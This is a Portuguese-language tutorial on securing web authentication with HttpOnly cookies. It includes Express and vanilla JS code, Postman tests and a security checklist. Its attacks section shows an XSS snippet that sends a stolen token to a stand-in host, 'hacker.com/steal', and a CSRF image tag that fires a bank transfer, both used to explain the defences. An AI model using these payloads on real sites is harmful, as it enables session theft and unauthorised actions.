# Segurança e Autenticação - Guia Completo

## 🔐 Por que HttpOnly Cookies?

Este projeto implementa autenticação profissional usando **HttpOnly Cookies** ao invés de localStorage/sessionStorage.

---

## 📊 Comparação de Métodos

### localStorage

**Como funciona:**
```javascript
// Salvar token
localStorage.setItem('token', token);

// Usar token
const token = localStorage.getItem('token');
fetch('/api/users/profile', {
  headers: { 'Authorization': `Bearer ${token}` }
});
```

**Problemas:**
- ❌ **Vulnerável a XSS**: Qualquer script malicioso pode ler o token
- ❌ **Persiste entre sessões**: Token fica salvo mesmo após fechar navegador
- ❌ **Gerenciamento manual**: Precisa adicionar token em cada requisição

**Quando usar:**
- ⚠️ Apenas para desenvolvimento/protótipos
- ⚠️ Dados não-sensíveis (preferências, tema, etc)

---

### sessionStorage

**Como funciona:**
```javascript
// Salvar token
sessionStorage.setItem('token', token);

// Usar token
const token = sessionStorage.getItem('token');
fetch('/api/users/profile', {
  headers: { 'Authorization': `Bearer ${token}` }
});
```

**Vantagens sobre localStorage:**
- ✅ Limpa ao fechar aba (mais seguro)

**Problemas:**
- ❌ **Ainda vulnerável a XSS**: Scripts maliciosos podem ler
- ❌ **Gerenciamento manual**: Precisa adicionar token em cada requisição

**Quando usar:**
- ⚠️ Dados temporários não-sensíveis
- ⚠️ Mock/desenvolvimento (temporário)

---

### HttpOnly Cookies ⭐ RECOMENDADO

**Como funciona:**

**Backend:**
```javascript
// Login - Retorna token em cookie
res.cookie('token', token, {
  httpOnly: true,      // Não acessível via JavaScript
  secure: true,        // Apenas HTTPS em produção
  sameSite: 'strict',  // Proteção CSRF
  maxAge: 30 * 24 * 60 * 60 * 1000 // 30 dias
});

res.json({
  success: true,
  data: { user } // Apenas dados do usuário
});
```

**Frontend:**
```javascript
// Login - Cookie salvo automaticamente
await fetch('/api/users/login', {
  method: 'POST',
  credentials: 'include', // IMPORTANTE!
  body: JSON.stringify({ email, senha })
});

// Requisições - Cookie enviado automaticamente
await fetch('/api/users/profile', {
  credentials: 'include' // IMPORTANTE!
});
```

**Vantagens:**
- ✅ **Protegido contra XSS**: JavaScript não pode acessar o token
- ✅ **Automático**: Cookie enviado automaticamente em cada requisição
- ✅ **Protegido contra CSRF**: Flag `sameSite: 'strict'`
- ✅ **Profissional**: Padrão usado por grandes empresas (Google, Facebook, etc)
- ✅ **Menos código**: Não precisa gerenciar token manualmente

**Quando usar:**
- ✅ **Sempre em produção**
- ✅ Tokens de autenticação
- ✅ Dados sensíveis

---

## 🛡️ Ataques e Proteções

### XSS (Cross-Site Scripting)

**O que é:**
Injeção de código JavaScript malicioso na página.

**Exemplo de ataque:**
```javascript
// Script malicioso injetado
const token = localStorage.getItem('token');
fetch('https://hacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token })
});
```

**Proteção:**
- ✅ **HttpOnly Cookie**: JavaScript não pode acessar
- ✅ **Content Security Policy (CSP)**: Bloqueia scripts não autorizados
- ✅ **Sanitização de inputs**: Valida e limpa dados do usuário

---

### CSRF (Cross-Site Request Forgery)

**O que é:**
Site malicioso faz requisições em nome do usuário autenticado.

**Exemplo de ataque:**
```html
<!-- Site malicioso -->
<img src="https://banco.com/transferir?valor=1000&para=hacker">
```

**Proteção:**
- ✅ **SameSite Cookie**: Cookie não enviado em requisições cross-site
- ✅ **CORS**: Backend valida origem das requisições
- ✅ **CSRF Token**: Token adicional para validação

---

## 🔧 Implementação Completa

### Backend (Express + cookie-parser)

**1. Instalar dependência:**
```bash
npm install cookie-parser
```

**2. Configurar app.js:**
```javascript
import express from 'express';
import cors from 'cors';
import cookieParser from 'cookie-parser';

const app = express();

// IMPORTANTE: cookie-parser ANTES das rotas
app.use(cookieParser());

// IMPORTANTE: CORS com credentials
app.use(cors({
  origin: 'http://localhost:5500', // URL do frontend
  credentials: true // Permite cookies
}));

app.use(express.json());
```

**3. Controller de login:**
```javascript
async login(req, res, next) {
  try {
    const { email, senha } = req.body;
    const { user, token } = await userService.login(email, senha);
    
    // Retorna token em HttpOnly Cookie
    res.cookie('token', token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 30 * 24 * 60 * 60 * 1000 // 30 dias
    });
    
    // Retorna apenas dados do usuário
    return res.json({
      success: true,
      data: { user }
    });
  } catch (error) {
    next(error);
  }
}
```

**4. Controller de logout:**
```javascript
async logout(req, res, next) {
  try {
    // Limpa o cookie
    res.clearCookie('token', {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict'
    });
    
    return res.json({
      success: true,
      message: 'Logout realizado com sucesso'
    });
  } catch (error) {
    next(error);
  }
}
```

**5. Middleware de autenticação:**
```javascript
const authMiddleware = (req, res, next) => {
  try {
    // Lê token do cookie (não do header)
    const token = req.cookies.token;

    if (!token) {
      throw new AppError('Token não fornecido', 401);
    }

    jwt.verify(token, process.env.JWT_SECRET, (err, decoded) => {
      if (err) {
        throw new AppError('Token inválido', 401);
      }

      req.user = decoded;
      return next();
    });
  } catch (error) {
    next(error);
  }
};
```

---

### Frontend (Vanilla JS)

**1. Configurar auth.js:**
```javascript
const auth = {
  async login(email, senha) {
    const response = await fetch(`${CONFIG.API_BASE_URL}/users/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include', // IMPORTANTE!
      body: JSON.stringify({ email, senha })
    });

    if (!response.ok) {
      const error = await response.json();
      throw new Error(error.message);
    }

    const data = await response.json();
    
    // Salva apenas dados do usuário (não o token)
    this.setUser(data.data.user);
    
    return data;
  },

  async logout() {
    try {
      await fetch(`${CONFIG.API_BASE_URL}/users/logout`, {
        method: 'POST',
        credentials: 'include' // IMPORTANTE!
      });
    } catch (error) {
      console.error('Erro ao fazer logout:', error);
    } finally {
      this.removeUser();
      window.location.href = '/pages/login.html';
    }
  },

  isAuthenticated() {
    return !!this.getUser();
  },

  getUser() {
    try {
      return JSON.parse(sessionStorage.getItem(CONFIG.USER_KEY) || 'null');
    } catch {
      return null;
    }
  },

  setUser(user) {
    sessionStorage.setItem(CONFIG.USER_KEY, JSON.stringify(user));
  },

  removeUser() {
    sessionStorage.removeItem(CONFIG.USER_KEY);
  }
};
```

**2. Configurar api.js:**
```javascript
class API {
  async request(endpoint, options = {}) {
    const url = `${CONFIG.API_BASE_URL}${endpoint}`;
    
    const config = {
      ...options,
      credentials: 'include', // IMPORTANTE!
      headers: {
        'Content-Type': 'application/json',
        ...options.headers
      }
    };

    const response = await fetch(url, config);
    
    if (!response.ok) {
      const error = await response.json();
      throw new Error(error.message);
    }

    return response.json();
  }

  async getUsers() {
    return this.request('/users');
  }

  async getProfile() {
    return this.request('/users/profile');
  }
}
```

---

## 🧪 Testando

### No Postman

**1. Login:**
```http
POST http://localhost:3000/api/users/login
Content-Type: application/json

{
  "email": "admin@eniac.edu.br",
  "senha": "admin123"
}
```

**2. Ver cookie:**
- Vá em **Headers** da resposta
- Procure por `Set-Cookie`
- Deve ter: `token=...; HttpOnly; SameSite=Strict`

**3. Requisições autenticadas:**
```http
GET http://localhost:3000/api/users/profile
```

O cookie é enviado automaticamente pelo Postman!

---

### No Navegador

**1. Login:**
```javascript
await auth.login('admin@eniac.edu.br', 'admin123');
```

**2. Ver cookie:**
- Abra DevTools (F12)
- Vá em **Application** → **Cookies**
- Veja o cookie `token` com flag `HttpOnly`

**3. Tentar acessar via JavaScript:**
```javascript
document.cookie; // Não mostra o token (HttpOnly)
```

**4. Requisições autenticadas:**
```javascript
await api.getProfile(); // Cookie enviado automaticamente
```

---

## 🚨 Erros Comuns

### "Cookie não é salvo"

**Causa:** Faltou `credentials: 'include'` no fetch

**Solução:**
```javascript
fetch('/api/users/login', {
  credentials: 'include' // ✅ Adicione isso
});
```

---

### "CORS error"

**Causa:** Backend não tem `credentials: true` no CORS

**Solução:**
```javascript
app.use(cors({
  origin: 'http://localhost:5500',
  credentials: true // ✅ Adicione isso
}));
```

---

### "Token não fornecido"

**Causa:** Cookie não está sendo enviado

**Soluções:**
1. Verifique `credentials: 'include'` no fetch
2. Verifique `credentials: true` no CORS
3. Verifique se domínios são compatíveis (localhost:5500 → localhost:3000)

---

## 📚 Referências

- [OWASP - HttpOnly Cookie](https://owasp.org/www-community/HttpOnly)
- [MDN - Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)
- [MDN - Fetch credentials](https://developer.mozilla.org/en-US/docs/Web/API/fetch#credentials)

---

## ✅ Checklist de Segurança

### Backend
- [ ] `cookie-parser` instalado e configurado
- [ ] CORS com `credentials: true`
- [ ] Login retorna token em HttpOnly Cookie
- [ ] Logout limpa o cookie
- [ ] Middleware lê token do cookie
- [ ] Cookie com flags: `httpOnly`, `secure`, `sameSite`

### Frontend
- [ ] Todas as requisições usam `credentials: 'include'`
- [ ] Token NÃO é armazenado em localStorage/sessionStorage
- [ ] Apenas dados não-sensíveis em sessionStorage
- [ ] Logout chama endpoint do backend

### Testes
- [ ] Login funciona e cookie é salvo
- [ ] Cookie tem flag HttpOnly (visível no DevTools)
- [ ] JavaScript não consegue acessar o token
- [ ] Requisições autenticadas funcionam
- [ ] Logout limpa o cookie

---

**Autenticação profissional implementada! 🎉**
